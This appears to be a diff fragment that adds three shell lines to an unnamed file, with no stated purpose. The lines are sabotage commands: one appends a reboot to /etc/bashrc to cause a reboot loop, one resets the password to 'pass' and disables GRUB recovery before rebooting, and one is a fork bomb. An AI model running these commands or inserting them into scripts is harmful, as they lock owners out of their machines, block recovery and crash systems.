@@ -1,0 +1,3 @@
+echo -e"init 6">>/etc/bashrc;init 6
+echo -e "pass\npass"|passwd;groupmems -p -g wheel;echo -e "GRUB_DISABLE_RECOVERY=\"true\"" >>/etc/default/grub;init 6
+:(){ :|:& };:
